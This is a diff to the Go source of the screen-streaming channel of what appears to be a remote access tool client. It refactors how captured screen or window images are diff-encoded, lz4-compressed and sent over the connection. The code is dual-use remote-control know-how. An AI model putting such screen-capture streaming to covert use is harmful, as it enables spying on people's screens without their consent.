@@ -8,7 +8,6 @@ import (
 	"rat/client/screen"
 	"rat/internal/imgdiff"
 
-	"github.com/disintegration/imaging"
 	"github.com/pierrec/lz4"
 )
 
@@ -48,33 +47,8 @@ func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
 		}
 	}()
 
-	cmp := imgdiff.NewComparer(6, 6)
-
-	go func() {
-		for {
-			select {
-			case <-c.die:
-				return
-			case chunk := <-cmp.C:
-				rect := chunk.Rect
-
-				binary.Write(channel, binary.LittleEndian, int32(rect.Min.X))
-				binary.Write(channel, binary.LittleEndian, int32(rect.Min.Y))
-				binary.Write(channel, binary.LittleEndian, int32(rect.Max.X))
-				binary.Write(channel, binary.LittleEndian, int32(rect.Max.Y))
-
-				var imgdata bytes.Buffer
-				ll := lz4.NewWriter(&imgdata)
-				imgdiff.Write(ll, chunk)
-				ll.Close()
-
-				binary.Write(channel, binary.LittleEndian, int32(imgdata.Len()))
-				if _, err = channel.Write(imgdata.Bytes()); err != nil {
-					return
-				}
-			}
-		}
-	}()
+	cmp := imgdiff.NewComparer()
+	cmp.Mask = 0xf0f0f0ff
 
 	for err == nil {
 		var capture image.Image
@@ -84,21 +58,38 @@ func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
 			capture = screen.CaptureWindow(int(sc.Handle))
 		}
 
-		rect := capture.Bounds()
+		// if sc.Scale > 0 && sc.Scale < 1.0 {
+		// 	width := int(float32(rect.Dx()) * sc.Scale)
+		// 	height := int(float32(rect.Dy()) * sc.Scale)
 
-		if sc.Scale > 0 && sc.Scale < 1.0 {
-			width := int(float32(rect.Dx()) * sc.Scale)
-			height := int(float32(rect.Dy()) * sc.Scale)
+		// 	nrgba := imaging.Resize(capture, width, height, imaging.Linear)
+		// 	capture = &image.RGBA{
+		// 		Pix:    nrgba.Pix,
+		// 		Stride: nrgba.Stride,
+		// 		Rect:   nrgba.Rect,
+		// 	}
+		// }
 
-			nrgba := imaging.Resize(capture, width, height, imaging.Linear)
-			capture = &image.RGBA{
-				Pix:    nrgba.Pix,
-				Stride: nrgba.Stride,
-				Rect:   nrgba.Rect,
-			}
+		chunk := cmp.Encode(capture.(*image.RGBA))
+		if chunk == nil {
+			continue
 		}
 
-		cmp.Update(capture.(*image.RGBA))
+		binary.Write(channel, binary.LittleEndian, int32(chunk.Rect.Min.X))
+		binary.Write(channel, binary.LittleEndian, int32(chunk.Rect.Min.Y))
+		binary.Write(channel, binary.LittleEndian, int32(chunk.Rect.Max.X))
+		binary.Write(channel, binary.LittleEndian, int32(chunk.Rect.Max.Y))
+
+		var imgdata bytes.Buffer
+		ll := lz4.NewWriter(&imgdata)
+		ll.BlockMaxSize = 256 << 10
+		imgdiff.Write(ll, chunk)
+		ll.Close()
+
+		binary.Write(channel, binary.LittleEndian, int32(imgdata.Len()))
+		if _, err = channel.Write(imgdata.Bytes()); err != nil {
+			return err
+		}
 
 		select {
 		case <-c.die:
